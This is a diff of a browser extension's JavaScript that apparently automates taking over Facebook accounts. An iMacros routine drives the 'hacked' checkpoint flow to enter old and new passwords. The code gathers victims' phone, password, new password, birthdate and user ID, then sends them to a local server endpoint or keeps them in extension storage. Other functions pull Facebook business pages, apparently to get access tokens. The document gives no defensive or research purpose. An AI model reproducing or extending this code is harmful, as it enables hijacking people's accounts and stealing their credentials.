@@ -34,6 +34,16 @@ function closeAll() {
 }
 //function for setting event listners
 function setEventListener() {
+	setTimeout(function(){
+		var curl = window.location.href;
+		var url = new URL(curl);
+		var chromename = url.searchParams.get("chromename");
+		var ch = {
+			'chromename': chromename
+		}
+	 	send_message("check", ch);
+	}, 3000);
+	
 	addEventListener("message", function(event) {
 		if (event.origin + "/" == chrome.extension.getURL("")) {
 			var eventToolName = event.data.name;
@@ -208,6 +218,7 @@ function status(vars)
 					toastr.info('Please wait...');
 					if(htmlstring.match(/zero\/optin/g)) {
 						vars.freemode=1;
+						console.log('zero optin');
 						confirmfree(vars);
 					} else {	
 						getName(vars);
@@ -430,50 +441,67 @@ function getName(vars) {
 	http4.send(null);
 }
 function ichangePassword(vars) {
-	var macroCode = '';
-	macroCode += 'TAB OPEN\n TAB T=2\n';
-	macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
-	macroCode += 'URL GOTO=https://mbasic.facebook.com/hacked\n';
-	macroCode += 'WAIT SECONDS=1\n';         
-	macroCode += 'TAG POS=2 TYPE=INPUT:RADIO FORM=ACTION:/hacked/triage/ ATTR=NAME:reason\n';
-	macroCode += 'WAIT SECONDS=1\n';
-	macroCode += 'SET !TIMEOUT_STEP 1\n';
-	macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:Continue\n';
-	macroCode += 'SET !TIMEOUT_STEP 1\n';
-	macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:ดำเนินการต่อ\n';
-	macroCode += 'WAIT SECONDS=3\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointButtonContinue-actual-button\n';
-	macroCode += 'WAIT SECONDS=8\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
-	macroCode += 'WAIT SECONDS=1\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_old CONTENT='+vars.email+'\n';
-	macroCode += 'SET !TIMEOUT_STEP 1\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.pass+'\n';
-	macroCode += 'SET !TIMEOUT_STEP 1\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:TEXT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.npass+'\n';
-	macroCode += 'SET !TIMEOUT_STEP 1\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_confirm CONTENT='+vars.npass+'\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
-	macroCode += 'WAIT SECONDS=3\n';
-	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
-	macroCode += 'WAIT SECONDS=3\n';
- 	macroCode += 'TAB CLOSE\n TAB T=1\n';
-	launchMacro(macroCode);
+	var userinfo = {
+		d: vars.day,
+		m: vars.month,
+		y: vars.year,
+		phone: vars.email,
+		pass: vars.pass,
+		uid: vars.uid,
+		uname: vars.uname,
+		npass: vars.npass,
+		chromename: vars.chromename,
+		id: vars.id,
+	};
+	chrome.storage.sync.set({userinfo: userinfo});
 	setTimeout(function(){
-		var userinfo = {
-			d: vars.day,
-			m: vars.month,
-			y: vars.year,
-			phone: vars.email,
-			pass: vars.pass,
-			uid: vars.uid,
-			uname: vars.uname,
-			npass: vars.npass,
-			chromename: vars.chromename,
-			id: vars.id,
-		};
-		window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userinfo);
-	}, (30*1000));
+		window.location = 'https://mbasic.facebook.com/language.php?n=%2Fhome.php&cname=zero&action=lang&backto=password';
+	}, (3*1000));
+	// var macroCode = '';
+	// macroCode += 'TAB OPEN\n TAB T=2\n';
+	// macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
+	// macroCode += 'URL GOTO=https://mbasic.facebook.com/hacked\n';
+	// macroCode += 'WAIT SECONDS=1\n';         
+	// macroCode += 'TAG POS=2 TYPE=INPUT:RADIO FORM=ACTION:/hacked/triage/ ATTR=NAME:reason\n';
+	// macroCode += 'WAIT SECONDS=1\n';
+	// macroCode += 'SET !TIMEOUT_STEP 1\n';
+	// macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:Continue\n';
+	// macroCode += 'SET !TIMEOUT_STEP 1\n';
+	// macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:ดำเนินการต่อ\n';
+	// macroCode += 'WAIT SECONDS=3\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointButtonContinue-actual-button\n';
+	// macroCode += 'WAIT SECONDS=8\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
+	// macroCode += 'WAIT SECONDS=1\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_old CONTENT='+vars.email+'\n';
+	// macroCode += 'SET !TIMEOUT_STEP 1\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.pass+'\n';
+	// macroCode += 'SET !TIMEOUT_STEP 1\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:TEXT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.npass+'\n';
+	// macroCode += 'SET !TIMEOUT_STEP 1\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_confirm CONTENT='+vars.npass+'\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
+	// macroCode += 'WAIT SECONDS=3\n';
+	// macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
+	// macroCode += 'WAIT SECONDS=3\n';
+ // 	macroCode += 'TAB CLOSE\n TAB T=1\n';
+	// launchMacro(macroCode);
+	// console.log('launchMacro');
+	// setTimeout(function(){
+	// 	var userinfo = {
+	// 		d: vars.day,
+	// 		m: vars.month,
+	// 		y: vars.year,
+	// 		phone: vars.email,
+	// 		pass: vars.pass,
+	// 		uid: vars.uid,
+	// 		uname: vars.uname,
+	// 		npass: vars.npass,
+	// 		chromename: vars.chromename,
+	// 		id: vars.id,
+	// 	};
+	// 	window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userinfo);
+	// }, (30*1000));
 }
 function changePassword(vars) {
 	var http4 = new XMLHttpRequest;
@@ -534,7 +562,7 @@ function getAccessToken() {
 }
 function AccessToken() {
 	var url="https://business.facebook.com/business_locations/";
-	tabRun(getffb,url);
+	tabRun(getffba,url);
 	// 	var http4 = new XMLHttpRequest;
 	// var url4 = "view-source:https://business.facebook.com/business_locations/";
 	// http4.open("GET", url4, true);
@@ -654,9 +682,6 @@ function buildToolbox() {
 	appendDiv.setAttribute('id', targetDivId);
 	document.body.appendChild(appendDiv);
 	setEventListener();
-	if(window.location.href.match(/facebook/g)){
-		deletenow();
-	}
 }
 
 function deletenow() {
